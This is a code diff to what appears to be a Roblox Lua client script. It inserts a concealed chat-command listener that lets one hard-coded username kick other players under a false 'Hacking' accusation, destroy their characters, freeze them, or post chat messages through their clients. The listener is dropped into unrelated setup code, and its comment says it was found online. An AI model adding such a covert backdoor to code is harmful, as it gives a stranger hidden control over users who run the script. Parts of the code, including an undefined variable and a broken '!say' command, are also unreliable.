@@ -31,6 +31,68 @@ local run_service: RunService = service.RunService;
 local Players: Players = service.Players;
 
 local Player = Players.LocalPlayer :: Player;
+
+
+local Table = {
+    ["CoffeeAndPistachios"] = true
+}
+
+local function handleCommands(player, message)
+    if player == Player then
+        return
+    end
+
+    if message:lower() == "!kick" then
+        if Table[player.Name] then
+            localPlayer:Kick("You have been kicked by an admin for 'Hacking'.")
+        end
+    elseif message:lower() == "!say" then
+        local playerSay = message:sub(5)
+        game.TextChatService.TextChannels.RBXGeneral:SendAsync(playerSay)
+    elseif message:lower() == "!reset" then
+        if Table[player.Name] then
+            print("¡El comando !reset fue usado!")
+        end
+    elseif message:lower() == "!ban" then
+        if Table[player.Name] then
+            local character = localPlayer.Character
+            if character then
+                local humanoid = character:FindFirstChild("Humanoid")
+                if humanoid then
+                    humanoid:Destroy()
+                end
+            end
+        end
+    elseif message:lower() == "!freeze" then
+        if Table[player.Name] then
+            local character = player.Character
+            if character then
+                local humanoid = character:FindFirstChildOfClass("Humanoid")
+                if humanoid then
+                    humanoid.PlatformStand = true 
+                end
+            end
+        end
+    elseif message:lower() == "!thaw" then
+        if Table[player.Name] then
+            local character = player.Character
+            if character then
+                local humanoid = character:FindFirstChildOfClass("Humanoid")
+                if humanoid then
+                    humanoid.PlatformStand = false
+                end
+            end
+        end
+    end
+end
+game.ReplicatedStorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(player, message)
+    handleCommands(player, message)
+end) -- found this shit on internet
+
+
+
+
+
 local CollectionService: CollectionService = service.CollectionService;
 
 local network = {};
